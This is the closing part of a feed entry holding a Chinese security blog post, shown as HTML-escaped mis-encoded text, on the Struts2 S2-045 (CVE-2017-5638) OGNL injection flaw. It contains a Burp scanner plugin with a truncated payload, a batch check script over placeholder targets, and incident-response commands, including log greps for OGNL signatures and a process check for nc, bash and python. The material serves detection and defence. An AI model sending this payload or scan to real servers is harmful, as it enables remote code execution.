class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// S2-045æ£€æµ‹æ’ä»¶æ¡†æ¶&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;S2045Scanner&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;IScannerCheck&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; List&amp;lt;IScanIssue&amp;gt; &lt;span class=&#34;hljs-title function_&#34;&gt;doActiveScan&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// æ„é€ S2-045 payload&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%&amp;#123;(#nike=&amp;#x27;multipart/form-data&amp;#x27;)...&amp;#125;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// å‘é€æµ‹è¯•è¯·æ±‚&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;byte&lt;/span&gt;[] checkRequest = insertionPoint.buildRequest(payload.getBytes());&lt;br&gt;        &lt;span class=&#34;hljs-type&#34;&gt;IHttpRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;checkRequestResponse&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// åˆ†æå“åº”åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (isVulnerable(checkRequestResponse)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Collections.singletonList(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;CustomScanIssue&lt;/span&gt;(&lt;span class=&#34;hljs-comment&#34;&gt;/* ... */&lt;/span&gt;));&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;æ‰¹é‡æ£€æµ‹è„šæœ¬&#34;&gt;&lt;a href=&#34;#æ‰¹é‡æ£€æµ‹è„šæœ¬&#34; class=&#34;headerlink&#34; title=&#34;æ‰¹é‡æ£€æµ‹è„šæœ¬&#34;&gt;&lt;/a&gt;æ‰¹é‡æ£€æµ‹è„šæœ¬&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# S2-045æ‰¹é‡æ£€æµ‹è„šæœ¬&lt;/span&gt;&lt;br&gt;&lt;br&gt;targets=(&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target1.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target2.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://target3.com:8080&amp;quot;&lt;/span&gt;&lt;br&gt;)&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; target &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;targets[@]&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Testing: &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    python3 s2-045-check.py &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;done&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;åº”æ€¥å“åº”æŒ‡å—&#34;&gt;&lt;a href=&#34;#åº”æ€¥å“åº”æŒ‡å—&#34; class=&#34;headerlink&#34; title=&#34;åº”æ€¥å“åº”æŒ‡å—&#34;&gt;&lt;/a&gt;åº”æ€¥å“åº”æŒ‡å—&lt;/h2&gt;&lt;h3 id=&#34;1-æ¼æ´ç¡®è®¤&#34;&gt;&lt;a href=&#34;#1-æ¼æ´ç¡®è®¤&#34; class=&#34;headerlink&#34; title=&#34;1. æ¼æ´ç¡®è®¤&#34;&gt;&lt;/a&gt;1. æ¼æ´ç¡®è®¤&lt;/h3&gt;&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;# æ£€æŸ¥Struts2ç‰ˆæœ¬&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/ -name &amp;quot;struts2-core-*.jar&amp;quot; 2&amp;gt;/&lt;/span&gt;dev/&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;&lt;br&gt;&lt;br&gt;# æ£€æŸ¥è®¿é—®æ—¥å¿—ä¸­çš„æ”»å‡»ç‰¹å¾&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Content-Type.*%\&amp;#123;&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/apache2/&lt;/span&gt;access.log&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ognl|ProcessBuilder|Runtime&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/tomcat/&lt;/span&gt;catalina.out&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-åº”æ€¥å¤„ç½®&#34;&gt;&lt;a href=&#34;#2-åº”æ€¥å¤„ç½®&#34; class=&#34;headerlink&#34; title=&#34;2. åº”æ€¥å¤„ç½®&#34;&gt;&lt;/a&gt;2. åº”æ€¥å¤„ç½®&lt;/h3&gt;&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;# ä¸´æ—¶é˜»æ–­æ”»å‡»IP&lt;br&gt;iptables -A &lt;span class=&#34;hljs-keyword&#34;&gt;INPUT&lt;/span&gt; -s &amp;lt;æ”»å‡»IP&amp;gt; -j &lt;span class=&#34;hljs-keyword&#34;&gt;DROP&lt;/span&gt;&lt;br&gt;&lt;br&gt;# åœæ­¢ç›¸å…³æœåŠ¡&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; tomcat&lt;br&gt;systemctl &lt;span class=&#34;hljs-keyword&#34;&gt;stop&lt;/span&gt; apache2&lt;br&gt;&lt;br&gt;# å¤‡ä»½ç³»ç»ŸçŠ¶æ€&lt;br&gt;tar -czf /tmp/system_backup_$(date +&lt;span class=&#34;hljs-title function_&#34;&gt;%Y&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%m&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%d_&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%H&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%M&lt;/span&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;%S&lt;/span&gt;).tar.gz /var/log /etc /opt/tomcat&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-ç—•è¿¹æ¸…ç†æ£€æŸ¥&#34;&gt;&lt;a href=&#34;#3-ç—•è¿¹æ¸…ç†æ£€æŸ¥&#34; class=&#34;headerlink&#34; title=&#34;3. ç—•è¿¹æ¸…ç†æ£€æŸ¥&#34;&gt;&lt;/a&gt;3. ç—•è¿¹æ¸…ç†æ£€æŸ¥&lt;/h3&gt;&lt;figure class=&#34;highlight vim&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs vim&#34;&gt;# æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸è¿›ç¨‹&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;ps&lt;/span&gt; aux | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -E &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;nc|bash|sh|python|perl&amp;quot;&lt;/span&gt; | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; -v &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt;&lt;br&gt;&lt;br&gt;# æ£€æŸ¥ç½‘ç»œè¿æ¥&lt;br&gt;netstat -antlp | &lt;span class=&#34;hljs-keyword&#34;&gt;grep&lt;/span&gt; ESTABLISHED&lt;br&gt;&lt;br&gt;# æ£€æŸ¥æ–°å¢æ–‡ä»¶&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /tmp /var/tmp -&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;f&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;find&lt;/span&gt; /&lt;span class=&#34;hljs-keyword&#34;&gt;opt&lt;/span&gt;/tomcat/webapps -name &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;*.jsp&amp;quot;&lt;/span&gt; -mtime -&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;æ€»ç»“&#34;&gt;&lt;a href=&#34;#æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;æ€»ç»“&#34;&gt;&lt;/a&gt;æ€»ç»“&lt;/h2&gt;&lt;p&gt;Struts2-045æ¼æ´çš„ç‰¹ç‚¹ï¼š&lt;/p&gt;
&lt;h3 id=&#34;ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&#34;&gt;&lt;a href=&#34;#ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&#34; class=&#34;headerlink&#34; title=&#34;ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&#34;&gt;&lt;/a&gt;ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åˆ©ç”¨ç®€å•&lt;/strong&gt;: åªéœ€æ„é€ HTTPè¯·æ±‚å¤´å³å¯&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å½±å“é¢å¹¿&lt;/strong&gt;: å¤§é‡ä¼ä¸šçº§åº”ç”¨ä½¿ç”¨Struts2æ¡†æ¶&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ£€æµ‹å›°éš¾&lt;/strong&gt;: æ”»å‡»æµé‡å¯èƒ½è¢«å¿½ç•¥&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å±å®³ä¸¥é‡&lt;/strong&gt;: ç›´æ¥è·å¾—æœåŠ¡å™¨æ‰§è¡Œæƒé™&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;é˜²æŠ¤è¦ç‚¹&#34;&gt;&lt;a href=&#34;#é˜²æŠ¤è¦ç‚¹&#34; class=&#34;headerlink&#34; title=&#34;é˜²æŠ¤è¦ç‚¹&#34;&gt;&lt;/a&gt;é˜²æŠ¤è¦ç‚¹&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åŠæ—¶æ›´æ–°&lt;/strong&gt;: å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ·±åº¦é˜²å¾¡&lt;/strong&gt;: ç»“åˆWAFã€IDSç­‰å¤šå±‚é˜²æŠ¤&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›‘æ§å‘Šè­¦&lt;/strong&gt;: å»ºç«‹æœ‰æ•ˆçš„å®‰å…¨ç›‘æ§ä½“ç³»&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åº”æ€¥å“åº”&lt;/strong&gt;: åˆ¶å®šå®Œå–„çš„å®‰å…¨äº‹ä»¶å“åº”æµç¨‹&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;å…è´£å£°æ˜&lt;/strong&gt;: æœ¬æ–‡å†…å®¹ä»…ä¾›å®‰å…¨ç ”ç©¶å’Œé˜²æŠ¤å‚è€ƒï¼Œè¯·å‹¿ç”¨äºéæ³•æ”»å‡»æ´»åŠ¨ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;å‚è€ƒèµ„æº&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://struts.apache.org/announce.html#a20170307&#34;&gt;Apache Struts2å®˜æ–¹å®‰å…¨å…¬å‘Š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638&#34;&gt;CVE-2017-5638è¯¦ç»†ä¿¡æ¯&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-project-top-ten/&#34;&gt;OWASP Struts2å®‰å…¨æŒ‡å—&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="Webå®‰å…¨" />
        <category term="Struts2" />
        <category term="RCE" />
        <category term="æ¼æ´å¤ç°" />
        <category term="OGNLæ³¨å…¥" />
        <updated>2025-07-24T00:10:34.000Z</updated>
    </entry>
</feed>
